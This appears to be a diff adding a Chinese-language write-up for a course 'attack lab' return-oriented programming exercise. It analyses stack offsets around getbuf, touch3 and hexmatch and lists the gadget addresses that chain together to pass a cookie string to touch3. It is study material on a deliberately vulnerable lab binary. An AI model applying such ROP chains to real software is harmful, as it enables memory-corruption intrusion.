@@ -1,0 +1,46 @@
+设刚好由getbuf调用Gets前%rsp的值为$rsp（缓冲区地址），Gets一定能正常退回，getbuf刚好退回前，%rsp为$rsp + 0x28，此时如果直接退回到touch3，touch3开始执行前%rsp为$rsp + 0x30，touch3开头有一个pushq（访问$rsp + 0x28处的8个字节），刚刚进入hexmatch（访问了$rsp + 0x20处的8个字节）时%rsp为$rsp + 0x20，hexmatch开头有3个pushq（访问了$rsp + 0x8处的24个字节），且显式地令%rsp减少0x80（预留了$rsp - 0x78处的128个字节）。
+
+只能通过不断popq或ret使得%rsp不断减少，使得后续过程使用地址足够高，来确保入侵缓冲区不被覆盖。cookie字符串最低可放置于$rsp，故至少应通过额外过程使得%rsp增加0x78。
+
+另一种思路是将cookie字符串放在最后一个退回地址之后，这更容易实现。
+
+(1) 0x4019ab:
+	popq	%rax
+	nop
+	ret
+
+(2) 0x4019dd:
+	movl	%eax, %edx
+	nop
+	ret
+
+(3) 0x401a34:
+	movl	%edx, %ecx
+	cmpb	%cl, %cl
+	ret
+
+(4) 0x401a27:
+	movl	%ecx, %esi
+	cmpb	%al, %al
+	ret
+
+(5) 0x401a06:
+	movq	%rsp, %rax
+	ret
+
+(6) 0x4019c5:
+	movq	%rax, %rdi
+	nop
+	ret
+
+(7) 0x4019d6:
+	leaq	(%rdi, %rsi, 1), %rax
+	ret
+
+(8) 0x4019c5:
+	movq    %rax, %rdi
+	nop
+	ret
+
+0x4018fa:
+	<touch3>
